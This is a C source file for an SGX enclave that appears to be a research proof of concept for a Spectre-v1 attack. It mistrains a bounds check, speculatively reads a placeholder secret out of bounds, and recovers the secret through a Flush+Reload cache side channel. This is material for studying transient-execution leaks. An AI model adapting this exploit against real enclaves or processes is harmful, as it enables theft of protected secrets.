#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
#define SECRET "INACCESSIBLESECRET"

int idx;

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}

char * create_secret() {
    char* secret = (char*)malloc(sizeof(char) * 128);

    if(secret == NULL) {
        enclave_printf("allocation of secret failed\n");
    }

    memcpy(secret, SECRET, sizeof(SECRET));

    return secret;
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        enclave_printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}


#ifdef TESTING

char leaked[sizeof(SECRET) + 1];

void not_ocall_init_attack(){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    flush_shared_memory();

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;
}

void not_ocall_encode(char c){
    cache_encode(c);
}

int not_ocall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        enclave_printf("[%d] leaked: %c\t(%d)\n", index, leaked[index], c);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}

#endif


void access_array(long long x, char * data) {
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    // HACK: since our secret is now after the public var and x can sometimes be negative
    long long zero = 0;
    long long slow_zero[1];
    slow_zero[0] = 0;
    size_t slow_len[1];
    slow_len[0] = len;

    mfence();
    //flush(&len);
    flush(&zero);
    flush(&slow_zero);
    flush(&slow_len);

    // ensure data is flushed at this point
    //mfence();
    // check that only accessible part (DATA) can be accessed
    if(((float)x / (float)slow_len[slow_zero[zero]] < 1) && x >= slow_zero[zero]) {

        // Disclosure Gadget
        char c = ((char*)(data + x))[0];

        // Transmit
#ifdef TESTING
            not_ocall_encode(c);
#else
            ocall_encode(c);
#endif
    }
}

void ecall_main(){
#ifdef TESTING
    not_ocall_init_attack();
#else
    ocall_init_attack();
#endif

    char* secret_data = create_secret(); 

    char* public_data = create_public();
    long long offset = public_data - secret_data;

#ifdef DEBUG_PRINT
    enclave_printf("Public %p, Secret %p, Offset: %llx \n", public_data, secret_data, offset);
#endif

    idx = 0;
    int c = 0;
    int score = 0;
#ifdef TESTING
    #define MAXITER 1000
#else
    #define MAXITER 10000
#endif

    while (1 && c != MAXITER) {
        c++;

        // mistrain with valid index    
        // Switch for training to untrusted (1: always untrusted, 2: last transmit was untrusted)

        for(int y = 0; y < 100; y++) {
            //Enable access if needed below
            access_array((y%(sizeof(DATA)-1)), public_data);
        }

        // potential out-of-bounds access
        //Enable access -> leak is possible
        access_array(idx - offset, public_data);

        // only show inaccessible values (SECRET)
        mfence(); // avoid speculation

        // Recover data from covert channel
        int res = 0;
#ifdef TESTING
        res = not_ocall_cache_decode(idx);
#else
        ocall_cache_decode(&res, idx);
#endif
        if (res){
            score++;
        }

        idx = (idx + 1) % (sizeof(SECRET) - 1);
    }

    printf("%d, %d", c, score);
    if (score > 0){
        printf(" <--\n");
    }else{
        printf("\n");
    }
}



